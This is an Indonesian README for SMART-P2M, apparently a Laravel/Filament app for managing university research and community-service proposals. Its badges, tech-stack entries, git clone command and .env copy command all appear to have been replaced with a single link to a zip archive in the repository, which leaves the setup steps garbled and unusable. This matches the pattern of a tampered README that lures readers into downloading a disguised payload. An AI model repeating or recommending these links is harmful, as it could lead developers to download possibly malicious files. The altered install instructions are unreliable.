# SMART-P2M (Sistem Manajemen Riset & Pengabdian kepada Masyarakat)

**SMART-P2M** adalah aplikasi web komprehensif yang dirancang untuk mengelola seluruh siklus hidup proposal penelitian dan pengabdian kepada masyarakat di lingkungan akademik, khususnya di UIN Sultan Aji Muhammad Idris Samarinda. Sistem ini dibangun dengan **TALL Stack (Tailwind CSS, https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip, Laravel, Livewire)** dan diperkuat oleh **Filament PHP** untuk menciptakan panel administrasi yang kuat dan interaktif.

![PHP Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip%2B-777BB4?style=for-the-badge&logo=php)
![Laravel Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)
![Filament Version](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)
![License](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)

Aplikasi ini menyediakan tiga panel terpisah dengan dasbor dan fungsionalitas yang disesuaikan untuk setiap peran: **Admin**, **Dosen/Peneliti**, dan **Reviewer**.

---

## ✨ Fitur Utama

### 👨‍💻 Panel Admin
Panel pusat untuk mengelola seluruh aspek sistem dengan kontrol penuh.
- **Dasbor Analitik:** Dilengkapi widget statistik ringkas, tabel proposal yang butuh tindakan, serta grafik komposisi status proposal dan jumlah pengguna.
- **Manajemen Proposal Lengkap:** Alur kerja penuh mulai dari melihat proposal masuk, menugaskan reviewer, memantau progres, hingga membuat keputusan final (`Diterima`, `Ditolak`, `Revisi`).
- **"Smart Reviewer Selection":** Fitur cerdas untuk menugaskan reviewer berdasarkan bidang ilmu dan beban kerja saat ini, membuat proses penunjukan lebih efisien dan akurat.
- **Manajemen Alur Review:** Admin dapat memajukan reviewer dari satu tahap penilaian ke tahap berikutnya (Proposal -> Presentasi -> Luaran).
- **Notifikasi Terpusat:** Sistem notifikasi berbasis database untuk memantau aktivitas penting di dalam sistem.

### 👩‍🏫 Panel Dosen/Peneliti (User)
Sebuah portal personal bagi para dosen untuk mengelola semua aktivitas akademiknya.
- **Dasbor Personal:** Header penyambut dinamis dengan jam *real-time*, statistik pencapaian (proposal diterima, perlu revisi), dan grafik personal untuk komposisi proposal dan publikasi.
- **Pengajuan Proposal:** Wizard multi-tahap yang intuitif untuk mengajukan proposal baru, lengkap dengan unggah berkas dan detail anggota tim.
- **Manajemen Profil Lengkap:** Halaman profil yang elegan untuk mengelola data diri, foto, dan password.
- **Integrasi SINTA Otomatis:** Fitur *web scraper* canggih untuk menyinkronkan data profil SINTA (Score, Affiliation, dll.) secara otomatis dengan satu klik tombol.
- **Pelacakan Proposal:** Dosen dapat melihat status proposalnya secara *real-time* dan melihat masukan dari reviewer secara anonim.

### 🕵️ Panel Reviewer
Antarmuka yang bersih dan fokus untuk membantu reviewer menyelesaikan tugas penilaian dengan efisien.
- **Dasbor Berbasis Tugas:** Widget statistik dan tabel "To-Do List" yang jelas memisahkan proposal yang perlu dinilai dan yang sudah selesai.
- **Formulir Penilaian Multi-Tahap:** Halaman penilaian terstruktur dengan beberapa tab (`Penilaian Proposal`, `Penilaian Presentasi`, `Penilaian Luaran`) yang alurnya dikontrol penuh oleh Admin.
- **Sistem Login Terpisah:** Keamanan terjamin dengan sistem otentikasi dan *guard* terpisah khusus untuk reviewer.
- **Manajemen Profil:** Halaman untuk mengelola data diri dan profil SINTA, lengkap dengan fitur sinkronisasi otomatis.

---

## 🛠️ Teknologi yang Digunakan

- **Framework:** Laravel 11
- **Panel Admin & UI:** Filament PHP 3
- **Frontend Interaktif:** Livewire 3 & https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip
- **Styling:** Tailwind CSS
- **Database:** MySQL
- **Web Scraper:** Symfony BrowserKit & HTTP Client

---

## 🚀 Instalasi & Setup

1.  **Clone repositori:**
    ```bash
    git clone [https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip](https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip)[rizyourbae]/[smart-p2m].git
    cd [smart-p2m]
    ```

2.  **Install dependensi:**
    ```bash
    composer install
    npm install
    ```

3.  **Setup Environment:**
    ```bash
    cp https://raw.githubusercontent.com/rizyourbae/smart-p2m/main/rabigenic/smart-p2m.zip .env
    php artisan key:generate
    ```
    * *Buka file `.env` dan sesuaikan konfigurasi database Anda (DB_DATABASE, DB_USERNAME, DB_PASSWORD).*

4.  **Jalankan Migrasi & Seeder:**
    ```bash
    php artisan migrate --seed
    ```

5.  **Buat Link Storage:**
    ```bash
    php artisan storage:link
    ```

6.  **Compile Aset Frontend:**
    ```bash
    npm run dev
    ```

7.  **Jalankan Server Development:**
    ```bash
    php artisan serve
    ```

---

## 🤝 Kontribusi

Kontribusi, isu, dan permintaan fitur sangat diterima. Jangan ragu untuk membuat *fork* dari repo ini dan membuat *pull request*.

---

## 📄 Lisensi

Proyek ini berada di bawah Lisensi MIT.

---

Dibuat dengan ❤️ oleh **[rizyourbae]**
